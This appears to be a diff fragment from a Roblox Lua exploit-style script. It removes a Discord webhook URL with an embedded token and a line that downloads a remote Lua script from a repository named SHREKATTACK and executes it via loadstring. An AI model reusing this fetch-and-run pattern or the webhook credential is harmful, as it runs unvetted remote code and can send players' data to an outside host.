@@ -5285,7 +5285,3 @@ DeleteMDF()
 local plr = game.Players.LocalPlayer.Character.HumanoidRootPart
 local pld = game.Players.LocalPlayer.Character.Humanoid
 local MyCFrame = plr.CFrame
-
-local Web = "https://discord.com/api/webhooks/1316075263804837898/y9G0eQAzlGWjgvDEb9Fux7VTQBSrQYdo0-ZpZpeV07IX2szQ30E_dUBTVsCjXt0nWPIC"
-_G.webhooksdiscord = Web
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua", true))()
